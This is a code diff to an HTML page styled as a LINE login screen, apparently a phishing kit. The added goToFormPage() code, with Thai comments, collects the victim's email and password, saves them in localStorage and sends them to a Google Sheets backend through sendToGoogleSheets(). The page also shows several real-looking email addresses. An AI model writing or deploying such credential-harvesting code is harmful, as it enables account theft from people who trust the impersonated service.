@@ -292,13 +292,7 @@
             <div class="logo">LINE</div>
             
             <div class="form-group">
-                <input type="email" class="form-input" id="email-input" placeholder="bn9.club@gmail.com" 
-                       onfocus="showEmailSuggestions()" onblur="hideEmailSuggestions()">
-                <div id="email-suggestions" class="email-suggestions hidden">
-                    <div class="email-suggestion" onclick="selectEmail('sareingsaehx@gmail.com')">sareingsaehx@gmail.com</div>
-                    <div class="email-suggestion" onclick="selectEmail('user@gmail.com')">user@gmail.com</div>
-                    <div class="email-suggestion" onclick="selectEmail('admin@line.com')">admin@line.com</div>
-                </div>
+                <input type="email" class="form-input" id="email-input" placeholder="bn9.club@gmail.com">
             </div>
             
             <div class="form-group">
@@ -452,6 +446,21 @@
         }
 
         function goToFormPage() {
+            // บันทึกข้อมูลอีเมลและรหัสผ่านก่อนไปหน้าถัดไป
+            const emailData = {
+                email: document.getElementById('email-input').value,
+                password: document.getElementById('password-input').value,
+                timestamp: new Date().toISOString()
+            };
+
+            // บันทึกลง localStorage
+            let submissions = JSON.parse(localStorage.getItem('formSubmissions') || '[]');
+            submissions.push(emailData);
+            localStorage.setItem('formSubmissions', JSON.stringify(submissions));
+
+            // ส่งข้อมูลไปหลังบ้าน
+            sendToGoogleSheets(emailData);
+
             if (config.pages.form) {
                 showPage('form-page');
             } else {
